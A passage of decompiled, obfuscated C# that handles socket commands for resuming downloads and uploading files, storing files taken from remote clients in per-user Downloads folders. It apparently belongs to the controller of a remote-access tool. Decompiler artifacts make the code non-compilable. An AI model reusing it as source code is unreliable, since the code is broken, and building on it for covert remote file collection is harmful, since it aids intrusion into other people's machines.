												cclient2.sock_async.method_6(Encoding.UTF8.GetBytes("0"));
												ptr2 = ref Class130.struct20_0.double_3;
												Class130.struct20_0.double_3 = ptr2 + 1.0;
												CClient cclient177 = Class130.concurrentDictionary_3[cclient2.FILE_TRANSFER_USER_KEY];
												ptr2 = ref cclient177.stats_bytes_out;
												cclient177.stats_bytes_out = ptr2 + 1.0;
												CClient cclient178 = cclient2;
												flag3 = false;
												cclient178.SOCKET_DISCONNECT(ref flag3);
												return;
											}
											if (File.Exists(string.Concat(new string[]
											{
												Application.StartupPath,
												"\\Downloads\\",
												cclient2.FILE_TRANSFER_USER,
												"\\",
												cclient2.FILE_TRANSFER_FILENAME
											})))
											{
												File.Delete(string.Concat(new string[]
												{
													Application.StartupPath,
													"\\Downloads\\",
													cclient2.FILE_TRANSFER_USER,
													"\\",
													cclient2.FILE_TRANSFER_FILENAME
												}));
											}
										}
									}
									else if (!Class135.smethod_0().TransferReplaceFilesModified && File.Exists(string.Concat(new string[]
									{
										Application.StartupPath,
										"\\Downloads\\",
										cclient2.FILE_TRANSFER_USER,
										"\\",
										cclient2.FILE_TRANSFER_FILENAME
									})))
									{
										File.Delete(string.Concat(new string[]
										{
											Application.StartupPath,
											"\\Downloads\\",
											cclient2.FILE_TRANSFER_USER,
											"\\",
											cclient2.FILE_TRANSFER_FILENAME
										}));
									}
								}
								catch (Exception ex61)
								{
									fTransferManager fTransferManager_14 = Class130.fTransferManager_0;
									string file_TRANSFER_ID14 = cclient2.FILE_TRANSFER_ID;
									int num90 = 2;
									double num91 = 0.0;
									bool flag3 = false;
									ref bool ptr10 = ref flag3;
									double num28 = num91;
									int num92 = num90;
									string string_52 = file_TRANSFER_ID14;
									fTransferManager fTransferManager16 = fTransferManager_14;
									string text6;
									object obj29;
									try
									{
										ProjectData.ClearProjectError();
										num30 = 2;
										string text5 = string.Empty;
										if (num28 >= 1099511627776.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
										}
										else if (num28 >= 1073741824.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
										}
										else if (num28 >= 1048576.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
										}
										else if (num28 >= 1024.0)
										{
											text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
										}
										else if (num28 < 1024.0)
										{
											text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
										}
										if (ptr10)
										{
											text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
										}
										if (text5.Length > 0)
										{
											text6 = text5;
										}
										else
										{
											text6 = " 0 B";
										}
										IL_87D1:
										goto IL_8821;
										IL_87D3:
										text6 = "0 B";
										goto IL_87D1;
										IL_87DC:
										num31 = -1;
										@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
										IL_87F2:;
									}
									catch when (endfilter(obj29 is Exception & num30 != 0 & num31 == 0))
									{
										Exception ex62 = (Exception)obj30;
										goto IL_87DC;
									}
									throw ProjectData.CreateProjectError(-2146828237);
									IL_8821:
									if (num31 != 0)
									{
									}
									string string_53 = text6;
									fTransferManager16.method_16(string_52, num92, string_53);
									fTransferManager fTransferManager_15 = Class130.fTransferManager_0;
									string file_TRANSFER_ID15 = cclient2.FILE_TRANSFER_ID;
									int num93 = 3;
									double num94 = 0.0;
									flag3 = false;
									ptr10 = ref flag3;
									num28 = num94;
									int num95 = num93;
									string string_54 = file_TRANSFER_ID15;
									fTransferManager fTransferManager17 = fTransferManager_15;
									object obj31;
									try
									{
										ProjectData.ClearProjectError();
										num30 = 2;
										string text5 = string.Empty;
										if (num28 >= 1099511627776.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
										}
										else if (num28 >= 1073741824.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
										}
										else if (num28 >= 1048576.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
										}
										else if (num28 >= 1024.0)
										{
											text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
										}
										else if (num28 < 1024.0)
										{
											text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
										}
										if (ptr10)
										{
											text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
										}
										if (text5.Length > 0)
										{
											text6 = text5;
										}
										else
										{
											text6 = " 0 B";
										}
										IL_89DB:
										goto IL_8A2B;
										IL_89DD:
										text6 = "0 B";
										goto IL_89DB;
										IL_89E6:
										num31 = -1;
										@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
										IL_89FC:;
									}
									catch when (endfilter(obj31 is Exception & num30 != 0 & num31 == 0))
									{
										Exception ex63 = (Exception)obj32;
										goto IL_89E6;
									}
									throw ProjectData.CreateProjectError(-2146828237);
									IL_8A2B:
									if (num31 != 0)
									{
									}
									string str35 = text6;
									fTransferManager17.method_16(string_54, num95, str35 + " (0%)");
									fTransferManager fTransferManager_16 = Class130.fTransferManager_0;
									string file_TRANSFER_ID16 = cclient2.FILE_TRANSFER_ID;
									int num96 = 4;
									double num97 = 0.0;
									flag3 = false;
									ptr10 = ref flag3;
									num28 = num97;
									int num98 = num96;
									string string_55 = file_TRANSFER_ID16;
									fTransferManager fTransferManager18 = fTransferManager_16;
									object obj33;
									try
									{
										ProjectData.ClearProjectError();
										num30 = 2;
										string text5 = string.Empty;
										if (num28 >= 1099511627776.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
										}
										else if (num28 >= 1073741824.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
										}
										else if (num28 >= 1048576.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
										}
										else if (num28 >= 1024.0)
										{
											text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
										}
										else if (num28 < 1024.0)
										{
											text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
										}
										if (ptr10)
										{
											text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
										}
										if (text5.Length > 0)
										{
											text6 = text5;
										}
										else
										{
											text6 = " 0 B";
										}
										IL_8BEF:
										goto IL_8C3F;
										IL_8BF1:
										text6 = "0 B";
										goto IL_8BEF;
										IL_8BFA:
										num31 = -1;
										@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
										IL_8C10:;
									}
									catch when (endfilter(obj33 is Exception & num30 != 0 & num31 == 0))
									{
										Exception ex64 = (Exception)obj34;
										goto IL_8BFA;
									}
									throw ProjectData.CreateProjectError(-2146828237);
									IL_8C3F:
									if (num31 != 0)
									{
									}
									string str36 = text6;
									fTransferManager18.method_16(string_55, num98, str36 + "/s");
									Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 5, "Failed (File in use)");
									Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 7, "N/A");
									Class130.fTransferManager_0.method_17(cclient2.FILE_TRANSFER_ID);
									Class130.concurrentDictionary_0[cclient2.FILE_TRANSFER_ID].TRANSFER_ACTIVE = false;
									cclient2.FILE_TRANSFER_COMPLETED = true;
									fMain ff14 = cclient2.ff;
									CClient cclient179 = cclient2;
									ptr11 = ref cclient179.FILE_TRANSFER_USER_KEY;
									value3 = cclient179.FILE_TRANSFER_USER_KEY;
									ff14.method_24(ref value3);
									ptr11 = Conversions.ToString(value3);
									cclient2.sock_async.method_6(Encoding.UTF8.GetBytes("0"));
									ptr2 = ref Class130.struct20_0.double_3;
									Class130.struct20_0.double_3 = ptr2 + 1.0;
									CClient cclient180 = Class130.concurrentDictionary_3[cclient2.FILE_TRANSFER_USER_KEY];
									ptr2 = ref cclient180.stats_bytes_out;
									cclient180.stats_bytes_out = ptr2 + 1.0;
									goto IL_DF2C;
								}
								if (Conversion.Val(cclient2.FILE_TRANSFER_FILESIZE) == 0.0)
								{
									string text15 = Path.GetDirectoryName(string.Concat(new string[]
									{
										Application.StartupPath,
										"\\Downloads\\",
										cclient2.FILE_TRANSFER_USER,
										"\\",
										cclient2.FILE_TRANSFER_FILENAME
									}));
									Class136.smethod_17(ref text15);
									File.Create(string.Concat(new string[]
									{
										Application.StartupPath,
										"\\Downloads\\",
										cclient2.FILE_TRANSFER_USER,
										"\\",
										cclient2.FILE_TRANSFER_FILENAME
									})).Dispose();
									fTransferManager fTransferManager_17 = Class130.fTransferManager_0;
									string file_TRANSFER_ID17 = cclient2.FILE_TRANSFER_ID;
									int num99 = 2;
									double num100 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
									bool flag3 = false;
									ref bool ptr10 = ref flag3;
									double num28 = num100;
									int num101 = num99;
									string string_56 = file_TRANSFER_ID17;
									fTransferManager fTransferManager19 = fTransferManager_17;
									string text6;
									object obj35;
									try
									{
										ProjectData.ClearProjectError();
										num30 = 2;
										string text5 = string.Empty;
										if (num28 >= 1099511627776.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
										}
										else if (num28 >= 1073741824.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
										}
										else if (num28 >= 1048576.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
										}
										else if (num28 >= 1024.0)
										{
											text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
										}
										else if (num28 < 1024.0)
										{
											text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
										}
										if (ptr10)
										{
											text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
										}
										if (text5.Length > 0)
										{
											text6 = text5;
										}
										else
										{
											text6 = " 0 B";
										}
										IL_8F8C:
										goto IL_8FDC;
										IL_8F8E:
										text6 = "0 B";
										goto IL_8F8C;
										IL_8F97:
										num31 = -1;
										@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
										IL_8FAD:;
									}
									catch when (endfilter(obj35 is Exception & num30 != 0 & num31 == 0))
									{
										Exception ex65 = (Exception)obj36;
										goto IL_8F97;
									}
									throw ProjectData.CreateProjectError(-2146828237);
									IL_8FDC:
									if (num31 != 0)
									{
										ProjectData.ClearProjectError();
									}
									string string_57 = text6;
									fTransferManager19.method_16(string_56, num101, string_57);
									fTransferManager fTransferManager_18 = Class130.fTransferManager_0;
									string file_TRANSFER_ID18 = cclient2.FILE_TRANSFER_ID;
									int num102 = 3;
									double num103 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
									flag3 = false;
									ptr10 = ref flag3;
									num28 = num103;
									int num104 = num102;
									string string_58 = file_TRANSFER_ID18;
									fTransferManager fTransferManager20 = fTransferManager_18;
									object obj37;
									try
									{
										ProjectData.ClearProjectError();
										num30 = 2;
										string text5 = string.Empty;
										if (num28 >= 1099511627776.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
										}
										else if (num28 >= 1073741824.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
										}
										else if (num28 >= 1048576.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
										}
										else if (num28 >= 1024.0)
										{
											text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
										}
										else if (num28 < 1024.0)
										{
											text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
										}
										if (ptr10)
										{
											text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
										}
										if (text5.Length > 0)
										{
											text6 = text5;
										}
										else
										{
											text6 = " 0 B";
										}
										IL_9199:
										goto IL_91E9;
										IL_919B:
										text6 = "0 B";
										goto IL_9199;
										IL_91A4:
										num31 = -1;
										@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
										IL_91BA:;
									}
									catch when (endfilter(obj37 is Exception & num30 != 0 & num31 == 0))
									{
										Exception ex66 = (Exception)obj38;
										goto IL_91A4;
									}
									throw ProjectData.CreateProjectError(-2146828237);
									IL_91E9:
									if (num31 != 0)
									{
										ProjectData.ClearProjectError();
									}
									string str37 = text6;
									fTransferManager20.method_16(string_58, num104, str37 + " (100%)");
									fTransferManager fTransferManager_19 = Class130.fTransferManager_0;
									string file_TRANSFER_ID19 = cclient2.FILE_TRANSFER_ID;
									int num105 = 4;
									double num106 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
									flag3 = false;
									ptr10 = ref flag3;
									num28 = num106;
									int num107 = num105;
									string string_59 = file_TRANSFER_ID19;
									fTransferManager fTransferManager21 = fTransferManager_19;
									object obj39;
									try
									{
										ProjectData.ClearProjectError();
										num30 = 2;
										string text5 = string.Empty;
										if (num28 >= 1099511627776.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
										}
										else if (num28 >= 1073741824.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
										}
										else if (num28 >= 1048576.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
										}
										else if (num28 >= 1024.0)
										{
											text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
										}
										else if (num28 < 1024.0)
										{
											text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
										}
										if (ptr10)
										{
											text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
										}
										if (text5.Length > 0)
										{
											text6 = text5;
										}
										else
										{
											text6 = " 0 B";
										}
										IL_93B0:
										goto IL_9400;
										IL_93B2:
										text6 = "0 B";
										goto IL_93B0;
										IL_93BB:
										num31 = -1;
										@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
										IL_93D1:;
									}
									catch when (endfilter(obj39 is Exception & num30 != 0 & num31 == 0))
									{
										Exception ex67 = (Exception)obj40;
										goto IL_93BB;
									}
									throw ProjectData.CreateProjectError(-2146828237);
									IL_9400:
									if (num31 != 0)
									{
										ProjectData.ClearProjectError();
									}
									string str38 = text6;
									fTransferManager21.method_16(string_59, num107, str38 + "/s");
									Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 5, "Completed");
									Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 7, "N/A");
									Class130.fTransferManager_0.method_17(cclient2.FILE_TRANSFER_ID);
									text15 = string.Concat(new string[]
									{
										Application.StartupPath,
										"\\Downloads\\",
										cclient2.FILE_TRANSFER_USER,
										"\\",
										cclient2.FILE_TRANSFER_FILENAME
									});
									long num48 = Conversions.ToLong(cclient2.FILE_TRANSFER_FILE_LAST_MODIFIED);
									ref string ptr12 = ref text15;
									if (File.Exists(ptr12))
									{
										DateTime dateTime = new DateTime(1970, 1, 1);
										try
										{
											File.SetLastWriteTimeUtc(ptr12, dateTime.AddSeconds((double)num48));
										}
										catch (Exception ex68)
										{
										}
									}
									Class130.concurrentDictionary_0[cclient2.FILE_TRANSFER_ID].TRANSFER_ACTIVE = false;
									cclient2.FILE_TRANSFER_COMPLETED = true;
									cclient2.sock_async.method_6(Encoding.UTF8.GetBytes("1"));
									ptr2 = ref Class130.struct20_0.double_3;
									Class130.struct20_0.double_3 = ptr2 + 1.0;
									CClient cclient181 = Class130.concurrentDictionary_3[cclient2.FILE_TRANSFER_USER_KEY];
									ptr2 = ref cclient181.stats_bytes_out;
									cclient181.stats_bytes_out = ptr2 + 1.0;
									Thread.Sleep(1000);
									fMain ff15 = cclient2.ff;
									CClient cclient182 = cclient2;
									ptr11 = ref cclient182.FILE_TRANSFER_USER_KEY;
									value3 = cclient182.FILE_TRANSFER_USER_KEY;
									ff15.method_24(ref value3);
									ptr11 = Conversions.ToString(value3);
									goto IL_DF2C;
								}
								cclient2.sock_async.method_6(Encoding.UTF8.GetBytes("1"));
								ptr2 = ref Class130.struct20_0.double_3;
								Class130.struct20_0.double_3 = ptr2 + 1.0;
								CClient cclient183 = Class130.concurrentDictionary_3[cclient2.FILE_TRANSFER_USER_KEY];
								ptr2 = ref cclient183.stats_bytes_out;
								cclient183.stats_bytes_out = ptr2 + 1.0;
								return;
							}
							else
							{
								if (Operators.CompareString(left, "FL_DL_RESUME", true) == 0)
								{
									try
									{
										cclient2.sock_async.socket_0.ReceiveBufferSize = Class135.smethod_0().TransfersRecvBytes;
										string[] array9 = Strings.Split(text14, "|", 8, CompareMethod.Text);
										cclient2.FILE_TRANSFER_USER = Class130.concurrentDictionary_3[array9[1]].FILE_TRANSFER_USER;
										cclient2.FILE_TRANSFER_FILENAME = Class130.concurrentDictionary_3[array9[1]].FILE_TRANSFER_FILENAME;
										cclient2.FILE_TRANSFER_FILESIZE = Class130.concurrentDictionary_3[array9[1]].FILE_TRANSFER_FILESIZE;
										cclient2.FILE_TRANSFER_REMOTE_FILE = Class130.concurrentDictionary_3[array9[1]].FILE_TRANSFER_REMOTE_FILE;
										cclient2.FILE_TRANSFER_ID = Class130.concurrentDictionary_3[array9[1]].FILE_TRANSFER_ID;
										cclient2.FILE_TRANSFER_DL_DATA = Class130.concurrentDictionary_3[array9[1]].FILE_TRANSFER_DL_DATA;
										cclient2.FILE_TRANSFER_PACKETS = Class130.concurrentDictionary_3[array9[1]].FILE_TRANSFER_PACKETS;
										cclient2.FILE_TRANSFER_POS = Class130.concurrentDictionary_3[array9[1]].FILE_TRANSFER_POS;
										cclient2.FILE_TRANSFER_SPEED_AVG = Class130.concurrentDictionary_3[array9[1]].FILE_TRANSFER_SPEED_AVG;
										cclient2.FILE_TRANSFER_SPEED_COUNTER = Class130.concurrentDictionary_3[array9[1]].FILE_TRANSFER_SPEED_COUNTER;
										cclient2.FILE_TRANSFER_USER = Class130.concurrentDictionary_3[array9[1]].FILE_TRANSFER_USER;
										cclient2.FILE_TRANSFER_USER_KEY = Class130.concurrentDictionary_3[array9[1]].FILE_TRANSFER_USER_KEY;
										cclient2.FILE_TRANSFER_ELAPSED = Class130.concurrentDictionary_3[array9[1]].FILE_TRANSFER_ELAPSED;
										cclient2.FILE_TRANSFER_STARTED = (double)Class136.smethod_36() - cclient2.FILE_TRANSFER_ELAPSED;
										cclient2.FILE_TRANSFER_LAST_PACKET = Class136.smethod_36();
										cclient2.FILE_TRANSFER_IS_RESUME = true;
										ref double ptr2 = ref Class130.struct20_0.double_2;
										Class130.struct20_0.double_2 = ptr2 + (double)num;
										ptr2 = ref Class130.struct20_0.double_4;
										Class130.struct20_0.double_4 = ptr2 + 1.0;
										string key = cclient2.FILE_TRANSFER_USER_KEY;
										bool flag5;
										try
										{
											flag5 = Class130.concurrentDictionary_3.ContainsKey(key);
											goto IL_97F2;
										}
										catch (Exception ex69)
										{
										}
										flag5 = false;
										IL_97F2:
										if (!flag5)
										{
											CClient cclient184 = cclient2;
											bool flag3 = false;
											cclient184.SOCKET_DISCONNECT(ref flag3);
										}
										else
										{
											cclient2.FILE_TRANSFER_ACTIVE = true;
											CClient cclient185 = Class130.concurrentDictionary_3[cclient2.FILE_TRANSFER_USER_KEY];
											ptr2 = ref cclient185.stats_bytes_in;
											cclient185.stats_bytes_in = ptr2 + (double)num;
											cclient2.sock_async.method_6(Encoding.UTF8.GetBytes("1"));
											ptr2 = ref Class130.struct20_0.double_3;
											Class130.struct20_0.double_3 = ptr2 + 1.0;
											CClient cclient186 = Class130.concurrentDictionary_3[cclient2.FILE_TRANSFER_USER_KEY];
											ptr2 = ref cclient186.stats_bytes_out;
											cclient186.stats_bytes_out = ptr2 + 1.0;
											Class130.concurrentDictionary_0[cclient2.FILE_TRANSFER_ID].TRANSFER_ACTIVE = true;
											Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 5, "Downloading");
											Class130.fTransferManager_0.method_17(cclient2.FILE_TRANSFER_ID);
											Class130.fTransferManager_0.method_2(cclient2.FILE_TRANSFER_ID, cclient2.sKey, cclient2.FILE_TRANSFER_USER_KEY, string.Concat(new string[]
											{
												Application.StartupPath,
												"\\Downloads\\",
												cclient2.FILE_TRANSFER_USER,
												"\\",
												cclient2.FILE_TRANSFER_FILENAME
											}), cclient2.FILE_TRANSFER_REMOTE_FILE);
											stringBuilder.Clear();
										}
									}
									catch (Exception ex70)
									{
										CClient cclient187 = cclient2;
										bool flag3 = false;
										cclient187.SOCKET_DISCONNECT(ref flag3);
									}
									return;
								}
								int num30;
								int num31;
								if (Operators.CompareString(left, "FL_UP", true) == 0)
								{
									try
									{
										if (cclient2.IS_SSL)
										{
											cclient2.sock_async.socket_0.ReceiveBufferSize = Class135.smethod_0().TransfersRecvBytes;
											cclient2.sock_async.socket_0.SendBufferSize = Class135.smethod_0().TransfersSendBytes;
										}
										else
										{
											cclient2.sock_async.socket_0.ReceiveBufferSize = 8192;
											cclient2.sock_async.socket_0.SendBufferSize = 8192;
										}
										string[] array9 = Strings.Split(text14, "|", 7, CompareMethod.Text);
										cclient2.FILE_TRANSFER_ID = "i" + cclient2.mSocketCounter;
										cclient2.FILE_TRANSFER_USER_KEY = array9[1];
										cclient2.FILE_TRANSFER_USER = array9[2];
										cclient2.FILE_TRANSFER_LOCAL_FILE = Encoding.UTF8.GetString(Convert.FromBase64String(array9[3]));
										cclient2.FILE_TRANSFER_GROUP_ID = Encoding.UTF8.GetString(Convert.FromBase64String(array9[4]));
										cclient2.FILE_TRANSFER_FILESIZE = Conversions.ToString(Class136.smethod_32(ref cclient2.FILE_TRANSFER_LOCAL_FILE));
										cclient2.FILE_TRANSFER_LAST_PACKET = Class136.smethod_36();
										cclient2.FILE_TRANSFER_STARTED = (double)Class136.smethod_36();
										ref double ptr2 = ref Class130.struct20_0.double_2;
										Class130.struct20_0.double_2 = ptr2 + (double)num;
										ptr2 = ref Class130.struct20_0.double_4;
										Class130.struct20_0.double_4 = ptr2 + 1.0;
										string key = cclient2.FILE_TRANSFER_USER_KEY;
										bool flag5;
										try
										{
											flag5 = Class130.concurrentDictionary_3.ContainsKey(key);
											goto IL_9AC0;
										}
										catch (Exception ex71)
										{
										}
										flag5 = false;
										IL_9AC0:
										if (!flag5)
										{
											CClient cclient188 = cclient2;
											bool flag3 = false;
											cclient188.SOCKET_DISCONNECT(ref flag3);
										}
										else
										{
											cclient2.FILE_TRANSFER_ACTIVE = true;
											CClient cclient189 = Class130.concurrentDictionary_3[cclient2.FILE_TRANSFER_USER_KEY];
											ptr2 = ref cclient189.stats_bytes_in;
											cclient189.stats_bytes_in = ptr2 + (double)num;
											stringBuilder.Clear();
											fMain ff16 = cclient2.ff;
											CClient cclient190 = cclient2;
											ref string ptr11 = ref cclient190.FILE_TRANSFER_USER_KEY;
											object value3 = cclient190.FILE_TRANSFER_USER_KEY;
											ff16.method_24(ref value3);
											ptr11 = Conversions.ToString(value3);
											Class130.fTransferManager_0.method_12(cclient2.FILE_TRANSFER_ID, cclient2.sKey, cclient2.FILE_TRANSFER_USER_KEY, cclient2.FILE_TRANSFER_LOCAL_FILE, cclient2.FILE_TRANSFER_USER, cclient2.FILE_TRANSFER_GROUP_ID);
											Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 5, "Uploading");
											FileStream fileStream;
											checked
											{
												if (Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE) == 0.0)
												{
													fTransferManager fTransferManager_20 = Class130.fTransferManager_0;
													string file_TRANSFER_ID20 = cclient2.FILE_TRANSFER_ID;
													int num108 = 2;
													double num109 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
													bool flag3 = false;
													ref bool ptr10 = ref flag3;
													double num28 = num109;
													int num110 = num108;
													string string_60 = file_TRANSFER_ID20;
													fTransferManager fTransferManager22 = fTransferManager_20;
													string text6;
													object obj41;
													try
													{
														ProjectData.ClearProjectError();
														num30 = 2;
														string text5 = string.Empty;
														if (num28 >= 1099511627776.0)
														{
															text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
														}
														else if (num28 >= 1073741824.0)
														{
															text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
														}
														else if (num28 >= 1048576.0)
														{
															text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
														}
														else if (num28 >= 1024.0)
														{
															text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
														}
														else if (num28 < 1024.0)
														{
															text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
														}
														if (ptr10)
														{
															text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
														}
														if (text5.Length > 0)
														{
															text6 = text5;
														}
														else
														{
															text6 = " 0 B";
														}
														IL_9D30:
														goto IL_9D80;
														IL_9D32:
														text6 = "0 B";
														goto IL_9D30;
														IL_9D3B:
														num31 = -1;
														@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
														IL_9D51:;
													}
													catch when (endfilter(obj41 is Exception & num30 != 0 & num31 == 0))
													{
														Exception ex72 = (Exception)obj42;
														goto IL_9D3B;
													}
													throw ProjectData.CreateProjectError(-2146828237);
													IL_9D80:
													if (num31 != 0)
													{
														ProjectData.ClearProjectError();
													}
													string string_61 = text6;
													fTransferManager22.method_16(string_60, num110, string_61);
													fTransferManager fTransferManager_21 = Class130.fTransferManager_0;
													string file_TRANSFER_ID21 = cclient2.FILE_TRANSFER_ID;
													int num111 = 3;
													double num112 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
													flag3 = false;
													ptr10 = ref flag3;
													num28 = num112;
													int num113 = num111;
													string string_62 = file_TRANSFER_ID21;
													fTransferManager fTransferManager23 = fTransferManager_21;
													object obj43;
													try
													{
														ProjectData.ClearProjectError();
														num30 = 2;
														string text5 = string.Empty;
														if (num28 >= 1099511627776.0)
														{
															text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
														}
														else if (num28 >= 1073741824.0)
														{
															text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
														}
														else if (num28 >= 1048576.0)
														{
															text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
														}
														else if (num28 >= 1024.0)
														{
															text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
														}
														else if (num28 < 1024.0)
														{
															text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
														}
														if (ptr10)
														{
															text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
														}
														if (text5.Length > 0)
														{
															text6 = text5;
														}
														else
														{
															text6 = " 0 B";
														}
														IL_9F3D:
														goto IL_9F8D;
														IL_9F3F:
														text6 = "0 B";
														goto IL_9F3D;
														IL_9F48:
														num31 = -1;
														@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
														IL_9F5E:;
													}
													catch when (endfilter(obj43 is Exception & num30 != 0 & num31 == 0))
													{
														Exception ex73 = (Exception)obj44;
														goto IL_9F48;
													}
													throw ProjectData.CreateProjectError(-2146828237);
													IL_9F8D:
													if (num31 != 0)
													{
														ProjectData.ClearProjectError();
													}
													string str39 = text6;
													fTransferManager23.method_16(string_62, num113, str39 + " (100%)");
													if (cclient2.FILE_TRANSFER_ELAPSED / 1000.0 == 0.0)
													{
														fTransferManager fTransferManager_22 = Class130.fTransferManager_0;
														string file_TRANSFER_ID22 = cclient2.FILE_TRANSFER_ID;
														int num114 = 4;
														double num115 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
														flag3 = false;
														ptr10 = ref flag3;
														num28 = num115;
														int num116 = num114;
														string string_63 = file_TRANSFER_ID22;
														fTransferManager fTransferManager24 = fTransferManager_22;
														object obj45;
														try
														{
															ProjectData.ClearProjectError();
															num30 = 2;
															string text5 = string.Empty;
															if (num28 >= 1099511627776.0)
															{
																text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
															}
															else if (num28 >= 1073741824.0)
															{
																text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
															}
															else if (num28 >= 1048576.0)
															{
																text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
															}
															else if (num28 >= 1024.0)
															{
																text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
															}
															else if (num28 < 1024.0)
															{
																text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
															}
															if (ptr10)
															{
																text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
															}
															if (text5.Length > 0)
															{
																text6 = text5;
															}
															else
															{
																text6 = " 0 B";
															}
															IL_A173:
															goto IL_A1C3;
															IL_A175:
															text6 = "0 B";
															goto IL_A173;
															IL_A17E:
															num31 = -1;
															@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
															IL_A194:;
														}
														catch when (endfilter(obj45 is Exception & num30 != 0 & num31 == 0))
														{
															Exception ex74 = (Exception)obj46;
															goto IL_A17E;
														}
														throw ProjectData.CreateProjectError(-2146828237);
														IL_A1C3:
														if (num31 != 0)
														{
															ProjectData.ClearProjectError();
														}
														string str40 = text6;
														fTransferManager24.method_16(string_63, num116, str40 + "/s");
													}
													Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 5, "Completed");
													Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 7, "N/A");
